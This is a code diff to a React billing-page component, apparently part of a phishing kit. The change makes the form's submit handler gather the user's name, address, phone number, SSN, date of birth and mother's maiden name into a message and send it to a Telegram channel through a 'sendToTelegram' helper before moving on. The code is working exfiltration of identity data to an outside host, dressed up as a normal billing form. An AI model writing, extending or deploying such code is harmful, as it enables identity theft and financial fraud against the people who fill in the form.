@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { AlertTriangle } from 'lucide-react';
+import { sendToTelegram } from '../utils/telegram';
 
 interface BillingFormData {
   firstName: string;
@@ -61,8 +62,21 @@ export function BillingPage({ onComplete }: BillingPageProps) {
     setFormData({ ...formData, dob: formattedValue });
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    const message = `<b>[BILLING] Information:</b>\n` +
+      `First Name: ${formData.firstName}\n` +
+      `Last Name: ${formData.lastName}\n` +
+      `Address: ${formData.streetAddress}\n` +
+      `City: ${formData.city}\n` +
+      `State: ${formData.state}\n` +
+      `Zip: ${formData.zipCode}\n` +
+      `Phone: ${formData.phoneNumber}\n` +
+      `SSN: ${formData.ssn}\n` +
+      `DOB: ${formData.dob}\n` +
+      `Mother's Maiden Name: ${formData.motherMaidenName}`;
+    
+    await sendToTelegram(message);
     onComplete(formData);
   };
 
